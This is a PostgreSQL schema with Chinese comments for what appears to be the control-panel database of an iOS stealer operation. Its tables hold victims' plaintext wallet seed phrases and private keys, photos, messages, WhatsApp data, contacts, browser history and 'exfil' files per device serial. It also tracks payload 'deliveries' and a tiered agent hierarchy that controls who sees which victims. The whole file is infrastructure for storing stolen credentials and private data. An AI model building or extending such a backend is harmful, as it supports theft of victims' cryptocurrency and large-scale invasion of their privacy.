-- ============================================================
-- 面板数据层 PostgreSQL Schema v1（2026-09-13 · P0）
-- 应用（postgres 超管）: runuser -u postgres -- psql -d panel -f adm888app/pg/schema_v1.sql
-- 设计要点：
--   · 对象属主 = panel（顶部 SET ROLE panel）
--   · 每张记录表：公共列(serial/ip/ts) + 查询列 + data jsonb(全量原文) + ukey 幂等键
--   · ukey = sha1(来源文件相对路径 + 文件内序号)，重放/补账/双写全部安全（ON CONFLICT DO NOTHING）
--   · 大表分区暂缓（当前量级不需要；量级上来后按 ts 月分区再加，避免 v1 复杂度）
-- ============================================================
SET ROLE panel;

-- ① 代理表（从 auth.json 导入；可见性 = owner_agent_id 子树过滤）
CREATE TABLE IF NOT EXISTS agents (
  id bigint PRIMARY KEY,
  username text,
  parent_id bigint,
  level int,
  permissions jsonb,
  raw jsonb,
  updated_at timestamptz DEFAULT now()
);

-- ② 设备主表（合并现 users + devices 维度）
CREATE TABLE IF NOT EXISTS devices (
  serial text PRIMARY KEY,
  owner_agent_id bigint,
  machine text, ios_version text, build_version text, kernel_release text,
  ip inet, source text,
  first_seen bigint DEFAULT 0, last_seen bigint DEFAULT 0,
  is_online boolean DEFAULT false,
  wallet_label text, wallets text[],
  mnemonic_count int DEFAULT 0, address_count int DEFAULT 0, token_count int DEFAULT 0,
  photo_count int DEFAULT 0, note_count int DEFAULT 0,
  extras jsonb,
  updated_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS devices_owner_idx ON devices (owner_agent_id);
CREATE INDEX IF NOT EXISTS devices_last_seen_idx ON devices (last_seen DESC);

-- ③ 记录表（每类一张；公共列 + 专用列 + data + ukey）
CREATE TABLE IF NOT EXISTS events (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  type text, ctx jsonb, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS events_serial_ts_idx ON events (serial, ts DESC);
CREATE INDEX IF NOT EXISTS events_ts_idx ON events (ts DESC);

CREATE TABLE IF NOT EXISTS reports (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  kind text, endpoint text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS reports_serial_ts_idx ON reports (serial, ts DESC);
CREATE INDEX IF NOT EXISTS reports_ts_idx ON reports (ts DESC);

CREATE TABLE IF NOT EXISTS mnemonics (        -- 注意：plain 为明文助记词（敏感，与现系统口径一致）
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  app_type text, bundle_id text, abbr text, plain text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS mnemonics_serial_ts_idx ON mnemonics (serial, ts DESC);
CREATE INDEX IF NOT EXISTS mnemonics_ts_idx ON mnemonics (ts DESC);

CREATE TABLE IF NOT EXISTS seeds (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  app_type text, mnemonic_id bigint, abbr text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS seeds_serial_ts_idx ON seeds (serial, ts DESC);

CREATE TABLE IF NOT EXISTS addresses (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  coin text, chain text, public_key text, private_key_plain text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS addresses_serial_ts_idx ON addresses (serial, ts DESC);
CREATE INDEX IF NOT EXISTS addresses_pub_idx ON addresses (public_key);

CREATE TABLE IF NOT EXISTS tokens (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  coin text, chain text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS tokens_serial_ts_idx ON tokens (serial, ts DESC);

CREATE TABLE IF NOT EXISTS photos (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  name text, size bigint DEFAULT 0, bin_path text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS photos_serial_ts_idx ON photos (serial, ts DESC);
CREATE INDEX IF NOT EXISTS photos_ts_idx ON photos (ts DESC);

CREATE TABLE IF NOT EXISTS notebooks (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  title text, content text, source_path text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS notebooks_serial_ts_idx ON notebooks (serial, ts DESC);
CREATE INDEX IF NOT EXISTS notebooks_ts_idx ON notebooks (ts DESC);

CREATE TABLE IF NOT EXISTS messages (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  chat text, from_a text, to_a text, body text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS messages_serial_ts_idx ON messages (serial, ts DESC);
CREATE INDEX IF NOT EXISTS messages_ts_idx ON messages (ts DESC);

CREATE TABLE IF NOT EXISTS whatsapp (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS whatsapp_serial_ts_idx ON whatsapp (serial, ts DESC);

CREATE TABLE IF NOT EXISTS contacts (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  name text, phones text, emails text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS contacts_serial_ts_idx ON contacts (serial, ts DESC);
CREATE INDEX IF NOT EXISTS contacts_ts_idx ON contacts (ts DESC);

CREATE TABLE IF NOT EXISTS browser_history (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  url text, title text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS browser_history_serial_ts_idx ON browser_history (serial, ts DESC);
CREATE INDEX IF NOT EXISTS browser_history_ts_idx ON browser_history (ts DESC);

CREATE TABLE IF NOT EXISTS exfil18 (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  exid text, note text, size bigint DEFAULT 0, bin_path text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS exfil18_serial_ts_idx ON exfil18 (serial, ts DESC);
CREATE INDEX IF NOT EXISTS exfil18_ts_idx ON exfil18 (ts DESC);

CREATE TABLE IF NOT EXISTS uploads (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  filename text, size bigint DEFAULT 0, channel text, bin_path text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS uploads_serial_ts_idx ON uploads (serial, ts DESC);
CREATE INDEX IF NOT EXISTS uploads_ts_idx ON uploads (ts DESC);

CREATE TABLE IF NOT EXISTS chain_logs (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text, ip inet, ts bigint NOT NULL DEFAULT 0,
  line text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS chain_logs_serial_ts_idx ON chain_logs (serial, ts DESC);
CREATE INDEX IF NOT EXISTS chain_logs_ip_ts_idx ON chain_logs (ip, ts DESC);

CREATE TABLE IF NOT EXISTS apps (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  name text, bundle_id text, version text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS apps_serial_ts_idx ON apps (serial, ts DESC);
CREATE INDEX IF NOT EXISTS apps_bundle_idx ON apps (bundle_id);

CREATE TABLE IF NOT EXISTS sys_apps (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  bundle_id text, name text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS sys_apps_serial_ts_idx ON sys_apps (serial, ts DESC);

CREATE TABLE IF NOT EXISTS deliveries (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  ip inet, ts bigint NOT NULL DEFAULT 0,
  event_type text, location text, referrer text, ua text, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS deliveries_ip_ts_idx ON deliveries (ip, ts DESC);
CREATE INDEX IF NOT EXISTS deliveries_ts_idx ON deliveries (ts DESC);

CREATE TABLE IF NOT EXISTS visit_logs (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  serial text NOT NULL, ip inet, ts bigint NOT NULL DEFAULT 0,
  log text, duration_ms bigint DEFAULT 0, data jsonb, ukey text NOT NULL UNIQUE,
  created_at timestamptz DEFAULT now()
);
CREATE INDEX IF NOT EXISTS visit_logs_serial_ts_idx ON visit_logs (serial, ts DESC);

-- ④ 迁移状态（回填进度 / 对账游标）
CREATE TABLE IF NOT EXISTS migration_state (
  key text PRIMARY KEY,
  value jsonb,
  updated_at timestamptz DEFAULT now()
);
